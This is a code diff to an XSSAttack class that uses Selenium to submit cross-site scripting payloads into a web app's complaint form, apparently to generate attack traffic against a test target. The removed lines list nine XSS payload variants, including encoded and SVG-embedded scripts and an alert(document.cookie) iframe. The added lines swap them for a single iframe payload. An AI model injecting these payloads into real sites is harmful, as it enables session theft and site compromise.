@@ -565,48 +565,7 @@ class XSSAttack(Attack):
 
         attack = ""
         random_sleep(1, 3)
-        attackCategory = random.randint(0, 8)
-        attackKeyWordLength = random.randint(1, 500)
-
-        if attackCategory == 0:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
-        elif attackCategory == 1:
-            attackKeyWord = []
-            for i in range(attackKeyWordLength):
-                attackKeyWord.append(str(random.randint(65, 122)))
-            attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
-        elif attackCategory == 2:
-            attackKeyWord = []
-            for i in range(attackKeyWordLength):
-                attackKeyWord.append(str(random.randint(65, 122)))
-            attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
-        elif attackCategory == 3:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
-        elif attackCategory == 4:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
-        elif attackCategory == 5:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
-        elif attackCategory == 6:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
-        elif attackCategory == 7:
-            attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
-        elif attackCategory == 8:
-            attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
-            base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
-            base64decodeString = base64.b64encode(base64String.encode())
-            attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
-
-        # 1. move to the complaint page
-        self.driver.find_element_by_xpath('/html/body/nav/div/ul/li[10]').click()
-        random_sleep()
-
-        # 2. type command and upload file
-        self.driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(attack)
-        self.driver.find_element_by_xpath('//*[@id="submitButton"]').click()
-
+        attackKeyWordLength = random.randint(1, 100)
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "<<script>Foo</script>iframe src=\"javascript:alert(`" + attackKeyWord + "`)\">"
         return
